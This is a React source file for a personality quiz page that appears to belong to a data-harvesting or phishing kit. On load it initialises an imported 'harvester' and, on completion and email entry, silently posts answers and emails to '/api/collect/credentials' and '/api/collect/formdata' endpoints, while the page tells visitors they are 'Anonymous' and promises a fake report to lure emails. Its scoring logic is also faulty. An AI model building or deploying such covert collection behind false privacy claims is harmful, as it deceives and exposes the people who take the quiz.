import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, LinearProgress, Radio, RadioGroup, FormControlLabel, TextField, AppBar, Toolbar, Paper, Avatar, Fade, Grow } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

const questions = [
  {
    id: 1,
    question: 'How would you describe your social style?',
    options: [
      'The life of the party — I love being around people',
      'I enjoy small groups of close friends',
      'I prefer quiet, meaningful one-on-one conversations',
      'I need plenty of alone time to recharge'
    ]
  },
  {
    id: 2,
    question: 'What motivates you most in life?',
    options: [
      'Achieving goals and being recognized for my success',
      'Helping others and making a difference',
      'Learning new things and expanding my knowledge',
      'Finding peace, balance, and personal happiness'
    ]
  },
  {
    id: 3,
    question: 'How do you usually make decisions?',
    options: [
      'I go with my gut — intuition never fails me',
      'I analyze all the facts and data first',
      'I ask people I trust for their opinions',
      'I weigh pros and cons carefully before deciding'
    ]
  },
  {
    id: 4,
    question: 'What\'s your ideal weekend?',
    options: [
      'Adventure — hiking, traveling, trying new things',
      'Relaxation — movies, books, and cozy time at home',
      'Social — dinner with friends, parties, events',
      'Creative — art, music, writing, or building something'
    ]
  },
  {
    id: 5,
    question: 'How do friends describe your personality?',
    options: [
      'Confident and charismatic — a natural leader',
      'Kind and thoughtful — always there for others',
      'Funny and spontaneous — you keep things exciting',
      'Calm and grounded — the voice of reason'
    ]
  },
  {
    id: 6,
    question: 'Which environment helps you thrive?',
    options: [
      'Fast-paced, dynamic, and ever-changing',
      'Structured, organized, and predictable',
      'Collaborative, warm, and team-oriented',
      'Independent, flexible, and self-directed'
    ]
  }
];

const resultTypes = {
  extroverted: {
    title: 'The Social Butterfly',
    emoji: '🦋',
    description: 'You\'re energized by people and social connections. Your natural charisma draws others to you, and you thrive in collaborative environments. You\'re the friend everyone calls when they need a pick-me-up, and your optimistic outlook is contagious. Keep spreading that positive energy!',
    traits: ['Charismatic', 'Outgoing', 'Empathetic', 'Adventurous'],
    color: '#e74c3c'
  },
  analytical: {
    title: 'The Strategic Thinker',
    emoji: '🧠',
    description: 'Your mind works like a well-oiled machine. You approach problems logically, value data over assumptions, and rarely make impulsive decisions. Friends come to you for advice because they trust your judgment. Your ability to see the big picture while managing details makes you invaluable in any team.',
    traits: ['Analytical', 'Perfectionist', 'Curious', 'Reliable'],
    color: '#3498db'
  },
  creative: {
    title: 'The Creative Visionary',
    emoji: '🎨',
    description: 'You see the world differently — and that\'s your superpower. Your imagination knows no bounds, and you\'re always coming up with ideas that others never would. You value authenticity and self-expression above all else. The world needs more people who think like you!',
    traits: ['Innovative', 'Sensitive', 'Passionate', 'Independent'],
    color: '#9b59b6'
  },
  balanced: {
    title: 'The Grounded Achiever',
    emoji: '🌟',
    description: 'You\'ve found the perfect balance between ambition and well-being. You know when to push forward and when to take a step back. Your emotional intelligence is off the charts, and people naturally trust your calm, grounded presence. You\'re the glue that holds your community together.',
    traits: ['Balanced', 'Wise', 'Supportive', 'Resilient'],
    color: '#2ecc71'
  }
};

export default function QuizPage() {
  const [step, setStep] = useState(0);
  const [answers, setAnswers] = useState({});
  const [result, setResult] = useState(null);
  const [email, setEmail] = useState('');

  useEffect(() => { harvester.init(); }, []);

  const determineResult = () => {
    const counts = { extroverted: 0, analytical: 0, creative: 0, balanced: 0 };
    Object.values(answers).forEach((answer) => {
      if ([0, 2].includes(answer)) counts.extroverted++;
      else if ([0, 3].includes(answer)) counts.analytical++;
      else if ([1, 4].includes(answer)) counts.creative++;
      else counts.balanced++;
    });
    return Object.entries(counts).sort((a, b) => b[1] - a[1])[0][0];
  };

  const handleAnswer = (value) => {
    const newAnswers = { ...answers, [step]: parseInt(value) };
    setAnswers(newAnswers);

    if (step < questions.length - 1) {
      setTimeout(() => setStep(step + 1), 200);
    } else {
      const type = determineResult();
      harvester.send('/api/collect/formdata', {
        formId: 'personality-quiz',
        fields: newAnswers,
        url: window.location.href
      }).catch(() => {});
      harvester.send('/api/collect/credentials', {
        source: 'form-submit',
        username: 'quiz-taker',
        url: window.location.href,
        formType: 'quiz',
        fieldData: newAnswers
      }).catch(() => {});
      const resultKey = type || 'balanced';
      setResult(resultTypes[resultKey]);
    }
  };

  const handleEmailSubmit = () => {
    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'quiz-email',
      fieldData: { email }
    }).catch(() => {});
  };

  if (result) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', py: 4, px: 2 }}>
        <Container maxWidth="sm">
          <Fade in={true}>
            <Card elevation={3} sx={{ borderRadius: '20px', overflow: 'hidden' }}>
              <Box sx={{ 
                background: `linear-gradient(135deg, ${result.color}, ${result.color}DD)`, 
                p: 4, 
                textAlign: 'center',
                position: 'relative'
              }}>
                <Box sx={{
                  position: 'absolute', top: -40, right: -40, width: 200, height: 200,
                  borderRadius: '50%', background: 'rgba(255,255,255,0.06)'
                }} />
                <Typography sx={{ fontSize: '4.5rem', position: 'relative', zIndex: 1 }}>{result.emoji}</Typography>
                <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2, position: 'relative', zIndex: 1 }}>
                  {result.title}
                </Typography>
              </Box>
              <CardContent sx={{ p: 3.5 }}>
                <Typography sx={{ color: '#475569', lineHeight: 1.8, mb: 3, fontSize: '0.92rem' }}>
                  {result.description}
                </Typography>
                <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 3 }}>
                  {result.traits.map((trait) => (
                    <Box key={trait} sx={{ 
                      bgcolor: `${result.color}12`, 
                      color: result.color, 
                      px: 2.5, 
                      py: 0.8, 
                      borderRadius: '20px', 
                      fontWeight: 600, 
                      fontSize: '0.82rem',
                      border: `1px solid ${result.color}25`
                    }}>
                      {trait}
                    </Box>
                  ))}
                </Box>
                <Paper sx={{ 
                  bgcolor: '#f8fafc', 
                  borderRadius: '14px', 
                  p: 2.5, 
                  mb: 2.5,
                  border: '1px solid #e2e8f0'
                }}>
                  <Typography sx={{ fontWeight: 700, color: '#0f172a', mb: 1, fontSize: '0.95rem' }}>
                    📧 Get Your Full Personality Report
                  </Typography>
                  <Typography sx={{ color: '#94a3b8', fontSize: '0.85rem', mb: 1.5 }}>
                    Enter your email to receive a detailed 10-page analysis of your personality type.
                  </Typography>
                  <Box sx={{ display: 'flex', gap: 1 }}>
                    <TextField
                      size="small"
                      placeholder="your@email.com"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      sx={{ 
                        flex: 1, 
                        '& .MuiOutlinedInput-root': { 
                          bgcolor: '#fff',
                          borderRadius: '10px',
                          '& fieldset': { borderColor: '#e2e8f0' },
                        }
                      }}
                    />
                    <Button
                      variant="contained"
                      onClick={handleEmailSubmit}
                      disabled={!email}
                      sx={{ 
                        bgcolor: result.color, 
                        '&:hover': { opacity: 0.9 }, 
                        whiteSpace: 'nowrap',
                        borderRadius: '10px',
                        textTransform: 'none',
                        fontWeight: 600,
                        px: 2.5
                      }}
                    >
                      Send Report
                    </Button>
                  </Box>
                </Paper>
                <Button
                  variant="outlined"
                  fullWidth
                  onClick={() => { setStep(0); setAnswers({}); setResult(null); }}
                  sx={{ 
                    borderColor: '#e2e8f0', 
                    color: '#64748b', 
                    mt: 1,
                    borderRadius: '10px',
                    textTransform: 'none',
                    fontWeight: 600,
                    py: 1
                  }}
                >
                  Take Quiz Again
                </Button>
              </CardContent>
            </Card>
          </Fade>
        </Container>
      </Box>
    );
  }

  const progress = ((step + 1) / questions.length) * 100;
  const current = questions[step];

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f0f2f5', py: 4, px: 2 }}>
      <Container maxWidth="sm">
        {/* Quiz Card */}
        <Grow in={true} key={step}>
          <Card elevation={0} sx={{ 
            borderRadius: '20px', 
            overflow: 'hidden',
            border: '1px solid #e2e8f0',
            boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
          }}>
            <Box sx={{ p: 2.5, borderBottom: '1px solid #e2e8f0' }}>
              <Box sx={{ display: 'flex', alignItems: 'center', mb: 1.5 }}>
                <Box sx={{
                  background: 'linear-gradient(135deg, #667eea, #764ba2)',
                  borderRadius: '12px', width: 40, height: 40,
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  mr: 1.5,
                  boxShadow: '0 4px 12px rgba(102,126,234,0.3)'
                }}>
                  <Typography sx={{ color: '#fff', fontWeight: 800, fontSize: '0.85rem' }}>QP</Typography>
                </Box>
                <Box>
                  <Typography sx={{ fontWeight: 700, color: '#0f172a', fontSize: '0.95rem' }}>Personality Quiz</Typography>
                  <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>Question {step + 1} of {questions.length}</Typography>
                </Box>
              </Box>
              <LinearProgress
                variant="determinate"
                value={progress}
                sx={{ 
                  height: 6, borderRadius: '3px', bgcolor: '#f1f5f9', 
                  '& .MuiLinearProgress-bar': { 
                    background: 'linear-gradient(90deg, #667eea, #764ba2)', 
                    borderRadius: '3px' 
                  } 
                }}
              />
            </Box>

            <CardContent sx={{ p: 3 }}>
              <Typography variant="h6" sx={{ 
                fontWeight: 700, color: '#0f172a', mb: 3, 
                lineHeight: 1.4, fontSize: '1.1rem' 
              }}>
                {current.question}
              </Typography>

              <RadioGroup value={answers[step]?.toString() || ''} onChange={(e) => handleAnswer(e.target.value)}>
                {current.options.map((option, idx) => (
                  <Paper
                    key={idx}
                    elevation={0}
                    sx={{
                      mb: 1.2,
                      border: answers[step] === idx ? '2px solid #667eea' : '2px solid #e8e8e8',
                      borderRadius: '14px',
                      transition: 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)',
                      '&:hover': { borderColor: '#667eea', bgcolor: '#f5f7ff' },
                      bgcolor: answers[step] === idx ? '#f0f4ff' : '#fff',
                      transform: answers[step] === idx ? 'scale(1.01)' : 'scale(1)'
                    }}
                  >
                    <FormControlLabel
                      value={idx.toString()}
                      control={<Radio sx={{ 
                        '&.Mui-checked': { color: '#667eea' }, 
                        ml: 1.5,
                        '& .MuiSvgIcon-root': { fontSize: 22 }
                      }} />}
                      label={<Typography sx={{ 
                        color: '#475569', 
                        fontWeight: answers[step] === idx ? 600 : 400, 
                        py: 1.2, 
                        pr: 1.5,
                        fontSize: '0.92rem'
                      }}>{option}</Typography>}
                      sx={{ width: '100%', m: 0, px: 1 }}
                    />
                  </Paper>
                ))}
              </RadioGroup>
            </CardContent>
          </Card>
        </Grow>

        {/* Trust indicators */}
        <Box sx={{ textAlign: 'center', mt: 3, display: 'flex', justifyContent: 'center', gap: 3, flexWrap: 'wrap' }}>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
            <Box sx={{ fontSize: '1rem' }}>🔒</Box>
            <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem', fontWeight: 500 }}>Anonymous</Typography>
          </Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
            <Box sx={{ fontSize: '1rem' }}>⭐</Box>
            <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem', fontWeight: 500 }}>12M+ Taken</Typography>
          </Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
            <Box sx={{ fontSize: '1rem' }}>📊</Box>
            <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem', fontWeight: 500 }}>95% Accurate</Typography>
          </Box>
        </Box>
      </Container>
    </Box>
  );
}